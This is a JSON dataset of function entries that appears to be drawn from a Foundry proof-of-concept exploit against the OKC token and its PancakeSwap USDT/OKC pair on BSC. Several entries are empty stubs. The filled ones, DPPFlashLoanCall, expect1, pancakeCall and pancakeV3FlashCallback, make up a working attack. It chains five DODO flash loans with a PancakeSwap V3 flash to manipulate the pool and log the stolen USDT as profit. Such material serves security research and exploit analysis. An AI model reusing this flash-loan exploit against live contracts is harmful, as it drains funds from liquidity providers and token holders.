[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "attack_contract",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 33_464_598);\n        assertEq(block.number, 33_464_598);\n        attack_contract = new AttackContract();\n        setLabel();\n        vm.deal(address(this), 1 ether);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        // 0.000000000000000001\n        attack_contract.expect1{value: 1 ether}();\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "DPP1",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "DPP2",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "DPP3",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "DPP4",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "DPP5",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        if (keccak256(data) == keccak256(bytes(\"0\"))) {\n            uint256 amount = USDT.balanceOf(address(DPP2));\n            DPP2.flashLoan(0, amount, address(this), \"1\");\n            USDT.transfer(address(DPP1), quoteAmount);\n        } else if (keccak256(data) == keccak256(bytes(\"1\"))) {\n            uint256 amount = USDT.balanceOf(address(DPP3));\n            DPP3.flashLoan(0, amount, address(this), \"2\");\n            USDT.transfer(address(DPP2), quoteAmount);\n        } else if (keccak256(data) == keccak256(bytes(\"2\"))) {\n            uint256 amount = USDT.balanceOf(address(DPP4));\n            DPP4.flashLoan(0, amount, address(this), \"3\");\n            USDT.transfer(address(DPP3), quoteAmount);\n        } else if (keccak256(data) == keccak256(bytes(\"3\"))) {\n            uint256 amount = USDT.balanceOf(address(DPP5));\n            DPP5.flashLoan(0, amount, address(this), \"4\");\n            USDT.transfer(address(DPP4), quoteAmount);\n        } else if (keccak256(data) == keccak256(bytes(\"4\"))) {\n            uint256 amount = USDT.balanceOf(address(DPP5));\n            pancakeV3Pool.flash(\n                address(this),\n                2_500_000_000_000_000_000_000_000,\n                0,\n                abi.encodePacked(uint256(2_500_000_000_000_000_000_000_000))\n            );\n            USDT.transfer(address(DPP5), quoteAmount);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "OKC",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "USDT",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "attack_contract1",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "attack_contract2",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "calculateAddress",
    "original_code": "    function calculateAddress(address creator, uint256 nonce) public pure returns (address) {\n        bytes memory data;\n        if (nonce == 0x00) {\n            data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), creator, bytes1(0x80));\n        } else if (nonce <= 0x7f) {\n            data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), creator, uint8(nonce));\n        } else if (nonce <= 0xff) {\n            data = abi.encodePacked(bytes1(0xd7), bytes1(0x94), creator, bytes1(0x81), uint8(nonce));\n        } else if (nonce <= 0xffff) {\n            data = abi.encodePacked(bytes1(0xd8), bytes1(0x94), creator, bytes1(0x82), uint16(nonce));\n        } else if (nonce <= 0xffffff) {\n            data = abi.encodePacked(bytes1(0xd9), bytes1(0x94), creator, bytes1(0x83), uint24(nonce));\n        } else {\n            data = abi.encodePacked(bytes1(0xda), bytes1(0x94), creator, bytes1(0x84), uint32(nonce));\n        }\n        return address(uint160(uint256(keccak256(data))));\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "expect1",
    "original_code": "    function expect1() external payable {\n        uint256 size;\n        address aaa = address(this);\n        assembly {\n            size := extcodesize(aaa)\n        }\n        console2.log(\"transfer_all size is: \", size);\n        approveAll();\n        console2.log(\n            \"minerPool OKC: \",\n            OKC.balanceOf(address(minerPool)),\n            \", \",\n            uint256(OKC.balanceOf(address(minerPool)) / 1e18)\n        );\n        console2.log(\n            \"LP USDT: \",\n            USDT.balanceOf(address(pancakePair_USDT_OKC)),\n            \", \",\n            uint256(USDT.balanceOf(address(pancakePair_USDT_OKC)) / 1e18)\n        );\n        console2.log(\n            \"LP OKC: \",\n            OKC.balanceOf(address(pancakePair_USDT_OKC)),\n            \", \",\n            uint256(OKC.balanceOf(address(pancakePair_USDT_OKC)) / 1e18)\n        );\n\n        uint256 amount = USDT.balanceOf(address(DPP1));\n        DPP1.flashLoan(0, amount, address(this), \"0\");\n        uint256 shengyu = USDT.balanceOf(address(this));\n        console2.log(\"usdt amount profit: \", shengyu, \" \", uint256(shengyu / 1e18));\n\n        console2.log(\n            \"minerPool OKC: \",\n            OKC.balanceOf(address(minerPool)),\n            \", \",\n            uint256(OKC.balanceOf(address(minerPool)) / 1e18)\n        );\n        console2.log(\n            \"LP USDT: \",\n            USDT.balanceOf(address(pancakePair_USDT_OKC)),\n            \", \",\n            uint256(USDT.balanceOf(address(pancakePair_USDT_OKC)) / 1e18)\n        );\n        console2.log(\n            \"LP OKC: \",\n            OKC.balanceOf(address(pancakePair_USDT_OKC)),\n            \", \",\n            uint256(OKC.balanceOf(address(pancakePair_USDT_OKC)) / 1e18)\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "getTokenPrice",
    "original_code": "    function getTokenPrice() public view returns (uint256) {\n        address[] memory path = new address[](2);\n        path[0] = address(OKC);\n        path[1] = address(USDT);\n        uint256[] memory amounts = pancakeRouter.getAmountsOut(1e18, path);\n        return amounts[1];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "minerPool",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "nonce",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        uint256 amount = abi.decode(data, (uint256));\n        USDT.transfer(address(pancakePair_USDT_OKC), amount);\n        console2.log(\"USDT transfer to LP: \", amount, \", \", uint256(amount / 1e18));\n        console2.log(\"LP USDT: \", USDT.balanceOf(address(pancakePair_USDT_OKC)));\n        console2.log(\"LP OKC: \", OKC.balanceOf(address(pancakePair_USDT_OKC)));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "pancakePair_USDT_OKC",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "pancakeRouter",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "pancakeV3FlashCallback",
    "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        uint256 amount_flash = abi.decode(data, (uint256));\n        uint256 ust_amount = USDT.balanceOf(address(this));\n        console2.log(\"usdt amount: \", ust_amount, \", \", uint256(ust_amount / 1e18));\n        console2.log(\"1 okc = \", uint256(getTokenPrice()), \" usdt\");\n\n        swap();\n        mint();\n        USDT.transfer(address(pancakeV3Pool), amount_flash + fee0);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "pancakeV3Pool",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AttackContract2",
    "source_type": "victim_contract",
    "function_name": "PancakePair_USDT_OKC",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AttackContract2",
    "source_type": "victim_contract",
    "function_name": "transfer_all",
    "original_code": "",
    "description": ""
  }
]